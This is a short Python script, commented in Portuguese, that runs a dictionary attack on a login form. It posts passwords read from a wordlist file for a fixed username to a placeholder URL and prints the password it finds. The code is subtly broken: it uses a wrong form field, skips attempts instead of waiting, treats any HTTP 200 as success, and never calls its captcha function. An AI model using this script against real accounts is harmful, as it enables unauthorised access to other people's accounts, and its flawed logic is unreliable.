import requests
import time
import os

# Limite de tentativas de login
login_attempt_limit = 10

min_time_between_attempts = 60
login_attempts = 0
last_login_attempt_time = 0

def login(username, password):
    global login_attempts
    global last_login_attempt_time  
    if login_attempts >= login_attempt_limit or time.time() - last_login_attempt_time < min_time_between_attempts:
        return False
    url = 'https://www.teste_exemplo.com'
    data = {'email_aqui@hotmail.com':username, 'password':password}
    try:
        r = requests.post(url, data=data)
        if r.status_code == 200:
            return True
        else:
            login_attempts += 1
            last_login_attempt_time = time.time()
            return False
    except:
        return False
def obtem_resposta_captcha():
    # Faça uma chamada para o endpoint que gera o captcha e retorna a imagem
    url = 'http://example.com/gera_captcha'
    captcha_response = requests.get(url)
    imagem_captcha = captcha_response.content
    return imagem_captcha
def exibe_senha_encontrada(senha):
    print(f'Senha encontrada: {senha}')
username = 'seu_usuario'

# Lista de arquivos de dicionário
wordlist = ['dicionario1.txt', 'dicionario2.txt', 'dicionario3.txt', 'dicionario4.txt']

if os.path.exists('dicionario.txt'):
    with open('dicionario.txt', 'r') as f:
        wordlist = f.read().splitlines()
else:
    print("Arquivo de dicionário não encontrado.")
for keyword in wordlist:
    login_attempt = login(username, keyword)
    if login_attempt:
        exibe_senha_encontrada(keyword)
        break
    else:
        print(f'Tentativa com senha {keyword} falhou.')
